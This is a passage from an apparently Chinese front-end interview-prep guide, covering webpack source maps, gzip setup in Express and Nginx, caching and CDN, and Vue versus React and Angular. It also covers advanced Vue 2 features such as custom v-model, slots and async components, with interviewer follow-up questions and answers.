出现了，它就是为了解决不好调式代码问题的</p>\\n<blockquote>\\n<p><code>SourceMap</code> 的可选值如下（<code>+</code> 号越多，代表速度越快，<code>-</code> 号越多，代表速度越慢, <code>o</code> 代表中等速度）</p>\\n</blockquote>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/7b07d8079454b3db.png\\" alt=\\"\\"></p>\\n<ul>\\n<li>开发环境推荐： <code>cheap-module-eval-source-map</code></li>\\n<li>生产环境推荐： <code>cheap-module-source-map</code></li>\\n</ul>\\n<p><strong>原因如下：</strong></p>\\n<ul>\\n<li><code>cheap</code>： 源代码中的列信息是没有任何作用，因此我们打包后的文件不希望包含列相关信息，只有行信息能建立打包前后的依赖关系。因此不管是开发环境或生产环境，我们都希望添加 <code>cheap</code> 的基本类型来忽略打包前后的列信息；</li>\\n<li><code>module</code> ：不管是开发环境还是正式环境，我们都希望能定位到<code>bug</code>的源代码具体的位置，比如说某个 <code>Vue</code> 文件报错了，我们希望能定位到具体的 <code>Vue</code> 文件，因此我们也需要 <code>module</code>配置；</li>\\n<li><code>soure-map</code> ：<code>source-map</code> 会为每一个打包后的模块生成独立的 <code>soucemap</code> 文件 ，因此我们需要增加<code>source-map</code> 属性；</li>\\n<li><code>eval-source-map</code>：<code>eval</code> 打包代码的速度非常快，因为它不生成 <code>map</code> 文件，但是可以对 <code>eval</code> 组合使用 <code>eval-source-map</code> 使用会将 <code>map</code> 文件以 <code>DataURL</code> 的形式存在打包后的 <code>js</code> 文件中。在正式环境中不要使用 <code>eval-source-map</code>, 因为它会增加文件的大小，但是在开发环境中，可以试用下，因为他们打包的速度很快。</li>\\n</ul>\\n<p><strong>7. 构建结果输出分析</strong></p>\\n<p>Webpack 输出的代码可读性非常差而且文件非常大，让我们非常头疼。为了更简单、直观地分析输出结果，社区中出现了许多可视化分析工具。这些工具以图形的方式将结果更直观地展示出来，让我们快速了解问题所在。接下来讲解我们在 Vue 项目中用到的分析工具：<code>webpack-bundle-analyzer</code></p>\\n<pre class=\\"language-js\\"><code>if (config.build.bundleAnalyzerReport) {\\n  var BundleAnalyzerPlugin = require(&#39;webpack-bundle-analyzer&#39;).BundleAnalyzerPlugin;\\n  webpackConfig.plugins.push(new BundleAnalyzerPlugin());\\n}\\n</code></pre>\\n<p>执行 <code>$ npm run build --report</code> 后生成分析报告如下</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/ff03763e07c21600.png\\" alt=\\"\\"></p>\\n<h3 id=\\"基础的-web-技术优化\\"><a class=\\"header-anchor\\" href=\\"#基础的-web-技术优化\\">#</a> 基础的 Web 技术优化</h3>\\n<p><strong>1. 开启 gzip 压缩</strong></p>\\n<blockquote>\\n<p><code>gzip</code> 是 <code>GNUzip</code> 的缩写，最早用于 <code>UNIX</code> 系统的文件压缩。<code>HTTP</code> 协议上的 <code>gzip</code> 编码是一种用来改进 <code>web</code> 应用程序性能的技术，<code>web</code> 服务器和客户端（浏览器）必须共同支持 gzip。目前主流的浏览器，Chrome，firefox，IE等都支持该协议。常见的服务器如 Apache，Nginx，IIS 同样支持，<code>zip</code> 压缩效率非常高，通常可以达到 <code>70%</code> 的压缩率，也就是说，如果你的网页有 <code>30K</code>，压缩之后就变成了 <code>9K</code> 左右</p>\\n</blockquote>\\n<p>以下我们以服务端使用我们熟悉的 <code>express</code> 为例，开启 <code>gzip</code> 非常简单，相关步骤如下：</p>\\n<pre class=\\"language-text\\"><code>npm install compression --save\\n</code></pre>\\n<pre class=\\"language-js\\"><code>var compression = require(&#39;compression&#39;);\\nvar app = express();\\napp.use(compression())\\n</code></pre>\\n<p>重启服务，观察网络面板里面的 <code>response header</code>，如果看到如下红圈里的字段则表明 <code>gzip</code> 开启成功</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/5147e6ec0da2e575.png\\" alt=\\"\\"></p>\\n<p><strong>Nginx开启gzip压缩</strong></p>\\n<pre class=\\"language-bash\\"><code>#是否启动gzip压缩,on代表启动,off代表开启\\ngzip  on;\\n \\n#需要压缩的常见静态资源\\ngzip_types text/plain application/javascript   application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png;\\n \\n#由于nginx的压缩发生在浏览器端而微软的ie6很坑爹,会导致压缩后图片看不见所以该选\\n项是禁止ie6发生压缩\\ngzip_disable &quot;MSIE [1-6]\\\\.&quot;;\\n \\n#如果文件大于1k就启动压缩\\ngzip_min_length 1k;\\n \\n#以16k为单位,按照原始数据的大小以4倍的方式申请内存空间,一般此项不要修改\\ngzip_buffers 4 16k;\\n \\n#压缩的等级,数字选择范围是1-9,数字越小压缩的速度越快,消耗cpu就越大\\ngzip_comp_level 2;\\n</code></pre>\\n<p>要想配置生效，记得重启<code>nginx</code>服务</p>\\n<pre class=\\"language-text\\"><code>nginx -t\\nnginx -s reload\\n</code></pre>\\n<p><strong>2. 浏览器缓存</strong></p>\\n<p>为了提高用户加载页面的速度，对静态资源进行缓存是非常必要的，根据是否需要重新向服务器发起请求来分类，将 HTTP 缓存规则分为两大类（强制缓存，对比缓存）</p>\\n<p><strong>3. CDN 的使用</strong></p>\\n<p>浏览器从服务器上下载 CSS、js 和图片等文件时都要和服务器连接，而大部分服务器的带宽有限，如果超过限制，网页就半天反应不过来。而 CDN 可以通过不同的域名来加载文件，从而使下载文件的并发连接数大大增加，且CDN 具有更好的可用性，更低的网络延迟和丢包率</p>\\n<p><strong>4. 使用 Chrome Performance 查找性能瓶颈</strong></p>\\n<p><code>Chrome</code> 的 <code>Performance</code> 面板可以录制一段时间内的 <code>js</code> 执行细节及时间。使用 <code>Chrome</code> 开发者工具分析页面性能的步骤如下。</p>\\n<ul>\\n<li>打开 <code>Chrome</code> 开发者工具，切换到 <code>Performance</code> 面板</li>\\n<li>点击 <code>Record</code> 开始录制</li>\\n<li>刷新页面或展开某个节点</li>\\n<li>点击 <code>Stop</code> 停止录制</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/e7a4e7fe64ff0a41.png\\" alt=\\"\\"></p>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong><code>Nginx</code> 已开启 <code>gzip</code>，前端同学看到图片仍然很大，就认定配置没有生效；这个判断成立吗？</strong></p>\\n<p>不能仅凭图片体积判断，常见图片格式本身已经压缩，是否值得再做 <code>gzip</code> 要按资源类型评估。应在浏览器网络面板检查响应头及传输大小，重点确认 <code>CSS</code>、<code>JavaScript</code>、文本和 <code>XML</code> 等资源；压缩等级提高还会增加服务端 <code>CPU</code> 成本。</p>\\n</li>\\n<li>\\n<p><strong>一个 <code>Express</code> 服务返回大量脚本和样式文件，发布后传输体积没有变化，你会怎样确认并落地压缩？</strong></p>\\n<p>先确认服务已安装并在响应链路中启用 <code>compression</code> 中间件，再重启服务，通过网络面板检查响应头和实际传输大小。若前面还有代理或 <code>CDN</code>，也要确认请求是否命中了旧缓存；只修改应用代码却未让线上进程和缓存更新，结果不会变化。</p>\\n</li>\\n<li>\\n<p><strong>静态资源接入 <code>CDN</code> 后，架构师认为浏览器缓存可以全部关闭，因为 <code>CDN</code> 已经足够快；你会怎么反驳？</strong></p>\\n<p><code>CDN</code> 与浏览器缓存解决的是不同层次的问题，前者缩短资源到用户的网络距离，后者可直接避免重复下载。静态资源仍应根据更新策略配置强缓存或协商缓存；如果文件名不能随内容变化，过长缓存会让用户继续使用旧资源。</p>\\n</li>\\n<li>\\n<p><strong>用户反馈展开一个复杂节点时页面卡顿，但接口和资源下载都正常，你会如何用 <code>Chrome</code> 定位？</strong></p>\\n<p>在 <code>Performance</code> 面板开始录制，执行一次展开操作后停止，查看这段时间内 <code>JavaScript</code> 执行及相关耗时。应把长任务与具体交互和调用栈对应起来，再缩小到脚本计算或渲染路径；只看网络面板无法解释下载结束后的主线程卡顿。</p>\\n</li>\\n<li>\\n<p><strong>面向多地区用户的内容站预算有限，只能优先做 <code>gzip</code>、<code>CDN</code> 或浏览器缓存中的一项，你会如何取舍？</strong></p>\\n<p>应先根据瓶颈选方案：文本传输体积大时优先压缩，跨地域延迟明显时 <code>CDN</code> 更直接，重复访问占比高时浏览器缓存收益更稳定。三者能够叠加但不能互相替代；未测量资源类型、访问地域和缓存命中情况就定方案，容易把成本花在非瓶颈处。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_65-vue与angular以及react的区别\\"><a class=\\"header-anchor\\" href=\\"#_65-vue与angular以及react的区别\\">#</a> 65 Vue与Angular以及React的区别？</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><strong>更新模型</strong>：<code>Vue</code> 靠依赖收集精确更新；<code>React</code> 默认父组件更新会重渲染子树，靠 <code>memo</code> 手动剪枝</li>\\n<li><strong>写法</strong>：<code>Vue</code> 模板 + 编译期优化（静态提升、<code>PatchFlag</code>）；<code>React</code> <code>JSX</code> 就是 <code>JS</code>，灵活但编译期能优化的少</li>\\n<li><strong>状态</strong>：<code>Vue</code> 响应式对象可直接修改；<code>React</code> 强调不可变，<code>setState</code> 产出新引用</li>\\n<li><strong>Angular</strong>：完整框架（自带路由、<code>HTTP</code>、<code>DI</code>、<code>RxJS</code>），约束强、上手陡，适合大型企业级和多团队协作</li>\\n<li>选型看约束不看偏好：团队现有经验、生态成熟度、招聘难度、要不要跨端 —— 陌生框架的学习成本会实打实体现在第一个季度</li>\\n</ul>\\n<p><strong><code>Vue</code>、<code>React</code> 都强调组件化并使用虚拟 <code>DOM</code>，但模板写法、状态更新和渲染调度不同；<code>Angular</code> 则提供更完整且约束更强的框架能力。</strong> <code>Vue</code> 更偏近似 <code>HTML</code> 的模板和依赖追踪更新，数据通常由组件的 <code>data</code> 管理；<code>React</code> 使用 <code>JSX</code>，通过 <code>state</code> 和 <code>setState</code> 更新状态，并采用类似调度的方式处理虚拟树。<code>Angular</code> 采用 <code>TypeScript</code>，而 <code>AngularJS</code> 的数据更新依赖脏检查，监听越多开销越明显。选型时应结合团队学习成本、项目约束和配套生态，而不能只比较语法偏好。</p>\\n</section>\\n<h3 id=\\"vue与angularjs的区别\\"><a class=\\"header-anchor\\" href=\\"#vue与angularjs的区别\\">#</a> Vue与AngularJS的区别</h3>\\n<ul>\\n<li><code>Angular</code>采用<code>TypeScript</code>开发, 而<code>Vue</code>可以使用<code>javascript</code>也可以使用<code>TypeScript</code></li>\\n<li><code>AngularJS</code>依赖对数据做脏检查，所以<code>Watcher</code>越多越慢；<code>Vue.js</code>使用基于依赖追踪的观察并且使用异步队列更新，所有的数据都是独立触发的。</li>\\n<li><code>AngularJS</code>社区完善, <code>Vue</code>的学习成本较小</li>\\n</ul>\\n<h3 id=\\"vue与react的区别\\"><a class=\\"header-anchor\\" href=\\"#vue与react的区别\\">#</a> Vue与React的区别</h3>\\n<p><strong>相同点：</strong></p>\\n<ol>\\n<li><code>Virtual DOM</code>。其中最大的一个相似之处就是都使用了<code>Virtual DOM</code>。(当然<code>Vue</code>是在<code>Vue2.x</code>才引用的)也就是能让我们通过操作数据的方式来改变真实的<code>DOM</code>状态。因为其实<code>Virtual DOM</code>的本质就是一个<code>JS</code>对象，它保存了对真实<code>DOM</code>的所有描述，是真实<code>DOM</code>的一个映射，所以当我们在进行频繁更新元素的时候，改变这个<code>JS</code>对象的开销远比直接改变真实<code>DOM</code>要小得多。</li>\\n<li>组件化的开发思想。第二点来说就是它们都提倡这种组件化的开发思想，也就是建议将应用分拆成一个个功能明确的模块，再将这些模块整合在一起以满足我们的业务需求。</li>\\n<li><code>Props</code>。<code>Vue</code>和<code>React</code>中都有<code>props</code>的概念，允许父组件向子组件传递数据。</li>\\n<li>构建工具、Chrome插件、配套框架。还有就是它们的构建工具以及Chrome插件、配套框架都很完善。比如构建工具，<code>React</code>中可以使用<code>CRA</code>，<code>Vue</code>中可以使用对应的脚手架<code>vue-cli</code>。对于配套框架<code>Vue</code>中有<code>vuex、vue-router</code>，<code>React</code>中有<code>react-router、redux</code>。</li>\\n</ol>\\n<p><strong>不同点</strong></p>\\n<ol>\\n<li>模版的编写。最大的不同就是模版的编写，<code>Vue</code>鼓励你去写近似常规<code>HTML</code>的模板，<code>React</code>推荐你使用<code>JSX</code>去书写。</li>\\n<li>状态管理与对象属性。在<code>React</code>中，应用的状态是比较关键的概念，也就是<code>state</code>对象，它允许你使用<code>setState</code>去更新状态。但是在<code>Vue</code>中，<code>state</code>对象并不是必须的，数据是由<code>data</code>属性在<code>Vue</code>对象中进行管理。</li>\\n<li>虚拟<code>DOM</code>的处理方式不同。<code>Vue</code>中的虚拟<code>DOM</code>控制了颗粒度，组件层面走<code>watcher</code>通知，而组件内部走<code>vdom</code>做<code>diff</code>，这样，既不会有太多<code>watcher</code>，也不会让<code>vdom</code>的规模过大。而<code>React</code>走了类似于<code>CPU</code>调度的逻辑，把<code>vdom</code>这棵树，微观上变成了链表，然后利用浏览器的空闲时间来做<code>diff</code></li>\\n</ol>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>评审会上有人说 <code>Vue</code> 和 <code>React</code> 都用了 <code>Virtual</code> <code>DOM</code>，所以组件更新机制基本一样；面对一个频繁更新的仪表盘，你会怎样纠正？</strong></p>\\n<p>两者都用 <code>JavaScript</code> 对象描述界面并通过虚拟 <code>DOM</code> 更新真实 <code>DOM</code>，但更新组织方式不能据此视为相同。<code>Vue</code> 会在组件层由响应式依赖通知更新，再在组件内部执行虚拟 <code>DOM</code> 比较；<code>React</code> 的协调过程则围绕可调度的树结构展开，因此性能判断仍要落到具体更新路径。</p>\\n</li>\\n<li>\\n<p><strong>设计系统团队要让偏 <code>HTML</code> 背景的业务开发者快速维护表单，同时又要求复杂交互能充分使用 <code>JavaScript</code>，你会怎样比较模板与 <code>JSX</code>？</strong></p>\\n<p><code>Vue</code> 模板更接近常规 <code>HTML</code>，能为以标记结构为主的页面提供明确约束；<code>React</code> 的 <code>JSX</code> 把界面表达放进 <code>JavaScript</code>，复杂组合更直接。选择应结合团队能力和组件复杂度，不能把语法偏好等同于运行时性能优势。</p>\\n</li>\\n<li>\\n<p><strong>一个页面需要父组件把筛选条件传给十个图表子组件，候选人说 <code>React</code> 有 <code>props</code>、<code>Vue</code> 没有同等机制，你会怎样追问并判断？</strong></p>\\n<p>这个说法不成立，<code>Vue</code> 和 <code>React</code> 都通过 <code>props</code> 完成父组件向子组件的数据传递，也都以组件化方式组织页面。更有区分度的追问应落在子组件如何触发上层状态变化、更新如何传播；仅记住 <code>API</code> 名称不足以说明理解了数据流。</p>\\n</li>\\n<li>\\n<p><strong>线上列表筛选后出现大范围组件更新，团队争论应立刻从 <code>React</code> 改成 <code>Vue</code>；你会要求先查哪些证据？</strong></p>\\n<p>先用开发工具确认状态变化触发了哪些组件，再检查状态放置范围、属性传递和组件边界，而不是直接归因于框架。<code>Vue</code> 的组件级依赖通知可能缩小更新范围，<code>React</code> 也有自身的协调与调度机制；迁移框架成本高，且不能自动修复不合理的状态设计。</p>\\n</li>\\n<li>\\n<p><strong>新项目同时需要路由、全局状态和完善的调试工具，技术负责人只根据核心库大小选择 <code>Vue</code> 或 <code>React</code>，是否合理？</strong></p>\\n<p>不合理，二者都有成熟的构建工具、浏览器插件、路由和状态管理配套，选型应比较完整工程组合。<code>Vue</code> 可结合 <code>vue-router</code>、<code>vuex</code> 等方案，<code>React</code> 也有 <code>react-router</code>、<code>redux</code> 等生态；核心库只是总体成本的一部分，团队经验和既有依赖同样会影响交付。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_66-vue2高级用法\\"><a class=\\"header-anchor\\" href=\\"#_66-vue2高级用法\\">#</a> 66 Vue2高级用法</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>model</code> 选项自定义 <code>v-model</code> 用的 prop 和事件（<code>Vue 3</code> 改为 <code>v-model:xxx</code>，支持多个）</li>\\n<li><code>.sync</code> 是语法糖：<code>:visible.sync</code> = <code>:visible</code> + <code>@update:visible</code>（<code>Vue 3</code> 合并进 <code>v-model:visible</code>）</li>\\n<li><code>$attrs</code>/<code>$listeners</code> 用于二次封装组件透传；<code>Vue 3</code> 把 <code>$listeners</code> 并入了 <code>$attrs</code></li>\\n<li>⚠️ <code>Vue 2</code> 的 <code>provide</code>/<code>inject</code> <strong>默认不是响应式的</strong> —— 传的是那一刻的值，要响应式得传对象；<code>Vue 3</code> 配 <code>ref</code> 天然响应</li>\\n<li>其余：动态组件 <code>&lt;component :is&gt;</code>、递归组件、函数式组件、异步组件 + <code>loading</code>/<code>error</code> 状态</li>\\n</ul>\\n<p><strong><code>Vue 2</code> 的高级用法主要解决组件通信、内容扩展和按需渲染，例如自定义 <code>v-model</code>、<code>.sync</code>、作用域插槽、动态组件与异步组件。</strong> <code>.sync</code> 本质上是 <code>prop</code> 加 <code>update:prop</code> 事件的语法糖，到 <code>Vue 3</code> 中对应 <code>v-model:xxx</code>；自定义 <code>model</code> 也由 <code>modelValue</code> 和 <code>update:modelValue</code> 取代。<code>provide</code> 与 <code>inject</code> 适合跨层传值，但在 <code>Vue 2</code> 中默认不是响应式的，需要传对象或整个实例。动态组件适合标签页等类型不确定的场景，大组件则可通过 <code>import()</code> 异步加载，避免初始化时全部加载。</p>\\n</section>\\n<p>这一节汇总的是 <code>Vue 2</code> 里几个&quot;不常用但关键时刻很好用&quot;的能力。<strong>面试时的加分点不在于会用，而在于知道它们在 <code>Vue 3</code> 里对应什么。</strong></p>\\n<p><strong>速查表：</strong></p>\\n<table>\\n<thead>\\n<tr>\\n<th>用法</th>\\n<th>解决什么</th>\\n<th><code>Vue 3</code> 里的对应</th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n<td><code>model</code> 选项自定义 <code>v-model</code></td>\\n<td>组件的 <code>v-model</code> 默认用 <code>value</code>/<code>input</code>，颜色选择器、开关这类需要换成 <code>checked</code>/<code>change</code></td>\\n<td>直接用 <code>v-model:xxx</code>，支持多个</td>\\n</tr>\\n<tr>\\n<td><code>.sync</code> 修饰符</td>\\n<td>父子双向同步某个 <code>prop</code>（弹窗的 <code>visible</code>）</td>\\n<td>合并进 <code>v-model:visible</code></td>\\n</tr>\\n<tr>\\n<td><code>$attrs</code> / <code>$listeners</code></td>\\n<td>二次封装组件时透传属性和事件</td>\\n<td><code>$listeners</code> 并入 <code>$attrs</code></td>\\n</tr>\\n<tr>\\n<td><code>provide</code> / <code>inject</code></td>\\n<td>跨多层传递（主题、表单上下文），避免逐层 <code>props</code></td>\\n<td>同名 API，但支持响应式（配 <code>ref</code>）</td>\\n</tr>\\n<tr>\\n<td><code>nextTick</code></td>\\n<td>拿更新后的 <code>DOM</code></td>\\n<td>同名，也可 <code>await</code></td>\\n</tr>\\n<tr>\\n<td><code>slot-scope</code></td>\\n<td>子组件把数据传给父组件的模板</td>\\n<td>统一为 <code>v-slot</code> / <code>#</code></td>\\n</tr>\\n<tr>\\n<td>动态组件 <code>&lt;component :is&gt;</code></td>\\n<td>按条件渲染不同组件（Tab、表单渲染器）</td>\\n<td>同名</td>\\n</tr>\\n<tr>\\n<td>递归组件（<code>name</code> + 自引用）</td>\\n<td>树形菜单、评论嵌套</td>\\n<td>同名</td>\\n</tr>\\n<tr>\\n<td>函数式组件</td>\\n<td>无状态无实例，渲染开销更小</td>\\n<td><code>Vue 3</code> 里普通组件已足够快，价值下降</td>\\n</tr>\\n<tr>\\n<td>异步组件 + <code>loading</code>/<code>error</code></td>\\n<td>路由和大组件懒加载</td>\\n<td><code>defineAsyncComponent</code> + <code>Suspense</code></td>\\n</tr>\\n</tbody>\\n</table>\\n<p><strong>其中最值得展开的两个：</strong></p>\\n<p><strong>① <code>provide</code>/<code>inject</code> 在 <code>Vue 2</code> 里默认不是响应式的。</strong> 传下去的是那一刻的值，父组件后来改了子组件收不到。要响应式得传一个对象或者整个 <code>this</code>。<code>Vue 3</code> 里配合 <code>ref</code>/<code>reactive</code> 就天然响应式了 —— 这是很多人从 <code>Vue 2</code> 带过来的错误认知。</p>\\n<p><strong>② <code>.sync</code> 的本质就是语法糖：</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;Modal :visible.sync=&quot;show&quot; /&gt;\\n&lt;!-- 等价于 --&gt;\\n&lt;Modal :visible=&quot;show&quot; @update:visible=&quot;show = $event&quot; /&gt;\\n</code></pre>\\n<p>理解了这一点，<code>Vue 3</code> 把它合并进 <code>v-model:visible</code> 就非常自然 —— 两者本来就是同一个模式。</p>\\n<p>下面是各用法的具体代码：</p>\\n<h3 id=\\"自定义组件model\\"><a class=\\"header-anchor\\" href=\\"#自定义组件model\\">#</a> 自定义组件model</h3>\\n<pre class=\\"language-vue\\"><code>&lt;!-- 自定义 v-model --&gt;\\n&lt;CustomVModel v-model=&quot;name&quot;/&gt; \\n</code></pre>\\n<pre class=\\"language-vue\\"><code>&lt;!-- CustomVModel --&gt;\\n&lt;template&gt;\\n    &lt;!-- 例如：vue 颜色选择 --&gt;\\n    &lt;input type=&quot;text&quot;\\n        :value=&quot;text&quot;\\n        @input=&quot;$emit(&#39;change&#39;, $event.target.value)&quot;\\n    &gt;\\n    &lt;!--\\n        1. 上面的 input 使用了 :value 而不是 v-model\\n        2. 上面的 change 和 model.event 要对应起来\\n        3. text 属性对应起来\\n    --&gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nexport default {\\n    model: {\\n        prop: &#39;text&#39;, // 对应 props text\\n        event: &#39;change&#39;\\n    },\\n    props: {\\n        text1: String,\\n        default() {\\n            return &#39;&#39;\\n        }\\n    }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<h3 id=\\"vue3自定义组件model\\"><a class=\\"header-anchor\\" href=\\"#vue3自定义组件model\\">#</a> vue3自定义组件model</h3>\\n<pre class=\\"language-vue\\"><code>&lt;!-- index.vue --&gt;\\n&lt;CustomVModel v-model=&quot;name&quot;/&gt; \\n\\n&lt;!-- CustomVModel.vue --&gt;\\n&lt;template&gt;\\n    &lt;input type=&quot;text&quot;\\n        :value=&quot;modelValue&quot;\\n        @input=&quot;$emit(&#39;update:modelValue&#39;, $event.target.value)&quot;\\n    &gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nexport default {\\n    props: {\\n        modelValue: String,\\n    }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<h3 id=\\"vue2-slot\\"><a class=\\"header-anchor\\" href=\\"#vue2-slot\\">#</a> vue2 slot</h3>\\n<pre class=\\"language-vue\\"><code>&lt;!-- slotDemo.vue 默认插槽 --&gt;\\n&lt;template&gt;\\n    &lt;a :href=&quot;url&quot;&gt;\\n        &lt;slot&gt;\\n            默认内容，即父组件没设置内容时，这里显示\\n        &lt;/slot&gt;\\n    &lt;/a&gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nexport default {\\n    props: [&#39;url&#39;],\\n    data() {\\n        return {}\\n    }\\n}\\n&lt;/script&gt;\\n\\n&lt;!-- 用法 --&gt;\\n&lt;SlotDemo :url=&quot;website.url&quot;&gt;\\n    {{website.title}}\\n&lt;/SlotDemo&gt;\\n</code></pre>\\n<pre class=\\"language-vue\\"><code>&lt;!-- ScopedSlotDemo.vue 作用域插槽demo --&gt;\\n&lt;template&gt;\\n    &lt;a :href=&quot;url&quot;&gt;\\n        &lt;slot :slotData=&quot;website&quot;&gt;\\n            {{website.subTitle}} &lt;!-- 默认值显示 subTitle ，即父组件不传内容时 --&gt;\\n        &lt;/slot&gt;\\n    &lt;/a&gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nexport default {\\n    props: [&#39;url&#39;],\\n    data() {\\n        return {\\n            website: {\\n                url: &#39;http://test.com/&#39;,\\n                title: &#39;test&#39;,\\n                subTitle: &#39;subtitle&#39;\\n            }\\n        }\\n    }\\n}\\n&lt;/script&gt;\\n\\n&lt;!-- 用法 --&gt;\\n&lt;ScopedSlotDemo :url=&quot;website.url&quot;&gt;\\n    &lt;template v-slot=&quot;slotProps&quot;&gt;\\n        {{slotProps.slotData.title}}\\n    &lt;/template&gt;\\n&lt;/ScopedSlotDemo&gt;\\n</code></pre>\\n<pre class=\\"language-html\\"><code>&lt;!-- 具名插槽 --&gt;\\n&lt;div&gt;\\n    &lt;header&gt;\\n        &lt;slot name=&quot;header&quot; /&gt;\\n    &lt;/header&gt;\\n    &lt;main&gt;\\n        &lt;slot  /&gt;\\n    &lt;/main&gt;\\n    &lt;footer&gt;\\n        &lt;slot name=&quot;footer&quot; /&gt;\\n    &lt;/footer&gt;\\n&lt;/div&gt;\\n\\n&lt;!-- 用法 --&gt;\\n&lt;template&gt;\\n    &lt;template #header&gt;&lt;/template&gt;\\n    &lt;p&gt;默认显示到main slot中&lt;/p&gt;\\n    &lt;template #footer&gt;&lt;/template&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<h3 id=\\"vue2动态组件\\"><a class=\\"header-anchor\\" href=\\"#vue2动态组件\\">#</a> vue2动态组件</h3>\\n<p><strong>动态组件</strong></p>\\n<ul>\\n<li><code>:is=&quot;component-name</code></li>\\n<li>需要根据数据，动态渲染的场景。即组件类型不确定</li>\\n</ul>\\n<pre class=\\"language-vue\\"><code>&lt;component :is=&quot;compoentName&quot;/&gt;\\n</code></pre>\\n<h3 id=\\"vue2异步组件\\"><a class=\\"header-anchor\\" href=\\"#vue2异步组件\\">#</a> vue2异步组件</h3>\\n<ul>\\n<li><code>import()</code>函数</li>\\n<li>按需加载异步大组件</li>\\n</ul>\\n<pre class=\\"language-vue\\"><code>&lt;!-- 异步组件 --&gt;\\n&lt;template&gt;\\n    &lt;FormDemo v-if=&quot;showFormDemo&quot;/&gt;\\n    &lt;button @click=&quot;showFormDemo = true&quot;&gt;show form demo&lt;/button&gt;\\n&lt;/template&gt;\\n&lt;script&gt;\\nexport default {\\n    components: {\\n        FormDemo: () =&gt; import(&#39;./FormDemo&#39;), // 异步加载组件，初始化不加载\\n    },\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong><code>Vue</code> 2 首页把 <code>FormDemo</code> 注册成 <code>() =&gt; import(\'./FormDemo\')</code>，但模板中没有条件控制并且首屏直接渲染它；候选人说这样一定不会进入首包加载，成立吗？</strong></p>\\n<p>异步注册能让组件代码形成按需加载边界，但模板首屏立即需要它时，初始化阶段仍会发起对应模块请求。真正延后加载还要让组件只在用户需要时出现，例如配合 <code>v-if=&quot;showFormDemo&quot;</code>；否则只是拆包，不等于消除首屏等待。</p>\\n</li>\\n<li>\\n<p><strong>设置页有一个很重的高级表单，只有用户点击“展开高级配置”后才需要，你会怎样用 <code>Vue</code> 2 实现按需加载？</strong></p>\\n<p>把组件注册为 <code>FormDemo: () =&gt; import(\'./FormDemo\')</code>，并用 <code>v-if</code> 绑定展开状态，让首次渲染不创建该组件。点击后状态变为真，<code>Vue</code> 才请求并渲染对应模块；首次展开存在异步等待，应为慢速网络准备明确的加载反馈。</p>\\n</li>\\n<li>\\n<p><strong>产品把高级表单改成所有用户进入页面后都必须立刻填写，原先的异步组件方案还值得保留吗？</strong></p>\\n<p>它仍能拆分构建产物，但组件已成为首屏必需内容，按需加载带来的初始化收益会明显受限，还可能增加一次请求等待。此时应结合模块体积和加载链路重新评估；若拆包只制造可见延迟，直接同步加载可能更合适。</p>\\n</li>\\n<li>\\n<p><strong>用户第一次点击“显示表单”后区域一直空白，刷新页面又偶尔正常；代码是 <code>FormDemo: () =&gt; import(\'./FormDemo\')</code>，你会先查什么？</strong></p>\\n<p>先在网络面板检查异步模块请求是否发出、是否返回失败，再核对导入路径、构建产物和部署后的静态资源地址。还要确认控制 <code>v-if</code> 的状态确实变为真；异步加载只负责获取组件代码，路径错误或展示条件未成立都会表现为空白。</p>\\n</li>\\n<li>\\n<p><strong>同一页面有十几个小按钮组件和一个大型表单，团队准备全部改为异步组件以减小初始包，你会同意吗？</strong></p>\\n<p>优先异步加载体积大、低频出现且非首屏必需的表单，不必机械拆分十几个轻量按钮。过度拆分会增加模块请求、加载状态和错误处理的复杂度；异步组件的价值来自推迟不需要的代码，而不是让每个组件都单独加载。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_67-vue面试考察的高频原理\\"><a class=\\"header-anchor\\" href=\\"#_67-vue面试考察的高频原理\\">#</a> 67 Vue面试考察的高频原理</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>五个必问原理：<strong>响应式</strong>（<code>defineProperty</code> vs <code>Proxy</code> + 依赖收集）、<strong>虚拟 <code>DOM</code> 与 diff</strong>、<strong>模板编译</strong>、<strong>异步更新与 <code>nextTick</code></strong>、<strong>组件通信与生命周期</strong></li>\\n<li>回答原理题的套路：<strong>先说要解决什么问题 → 再说怎么实现 → 最后说代价和边界</strong>，只讲实现容易变成背源码</li>\\n<li>高频追问集中在&quot;边界&quot;：<code>Vue 2</code> 新增属性为什么不响应、<code>key</code> 用下标会怎样、<code>nextTick</code> 为什么不能自己写微任务</li>\\n<li>能主动带出 <code>Vue 2</code>/<code>Vue 3</code> 的差异和取舍（为什么换 <code>Proxy</code>、代价是什么），比只答一个版本更显深度</li>\\n<li>准备一个&quot;原理知识在项目里救过场&quot;的例子 —— 面试官很爱问&quot;这些原理对你实际工作有什么帮助&quot;</li>\\n</ul>\\n<p><strong><code>Vue</code> 高频原理的核心，是响应式收集变化，再通过虚拟 <code>DOM</code> 和 <code>diff</code> 